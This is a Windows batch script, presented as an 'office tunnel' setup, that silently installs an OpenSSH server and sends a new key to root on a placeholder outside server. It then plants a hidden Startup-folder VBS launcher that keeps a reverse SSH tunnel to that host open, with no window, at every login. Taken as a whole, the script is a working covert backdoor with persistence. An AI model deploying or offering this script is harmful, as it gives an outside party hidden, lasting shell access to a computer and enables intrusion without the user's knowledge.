@echo off
title Office Tunnel Setup (Hidden Service)
echo ============================================
echo   Office Tunnel Setup - Hidden Mode
echo   No window, runs silently in background
echo ============================================
echo.

echo Step 1/4: Installing SSH...
powershell -Command "Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0; Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Set-Service sshd -StartupType Automatic; Start-Service sshd" >nul 2>&1
echo Done.

echo Step 2/4: Generating SSH key...
if not exist "%USERPROFILE%\.ssh" mkdir "%USERPROFILE%\.ssh"
if not exist "%USERPROFILE%\.ssh\id_rsa" ssh-keygen -t rsa -b 2048 -f "%USERPROFILE%\.ssh\id_rsa" -N "" -q 2>nul
echo Done.

echo Step 3/4: Uploading key to server...
echo Password: SSH_PASSWORD
type "%USERPROFILE%\.ssh\id_rsa.pub" | ssh -o StrictHostKeyChecking=no root@YOUR_SERVER_IP "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
if errorlevel 1 (
    echo FAILED. Check network.
    pause
    exit /b
)
echo Done.

echo Step 4/4: Creating invisible auto-start tunnel...
REM Delete old startup bat
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\office-tunnel.bat" >nul 2>&1

REM Create VBS wrapper that runs SSH invisibly
echo Set WshShell = CreateObject^("WScript.Shell"^) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\office-tunnel.vbs"
echo WshShell.Run """%USERPROFILE%\.ssh\tunnel-loop.bat""", 0, False >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\office-tunnel.vbs"

REM Create the loop script
echo @echo off > "%USERPROFILE%\.ssh\tunnel-loop.bat"
echo :loop >> "%USERPROFILE%\.ssh\tunnel-loop.bat"
echo ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -N -R 2222:localhost:22 root@YOUR_SERVER_IP >> "%USERPROFILE%\.ssh\tunnel-loop.bat"
echo timeout /t 10 /nobreak ^>nul >> "%USERPROFILE%\.ssh\tunnel-loop.bat"
echo goto loop >> "%USERPROFILE%\.ssh\tunnel-loop.bat"

REM Kill any old tunnel
taskkill /f /im ssh.exe >nul 2>&1

REM Start invisibly now
wscript "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\office-tunnel.vbs"

echo Done.
echo.
echo ============================================
echo   SUCCESS!
echo.
echo   Tunnel runs silently in background.
echo   Auto-starts on every login. No window!
echo ============================================
echo.
timeout /t 5
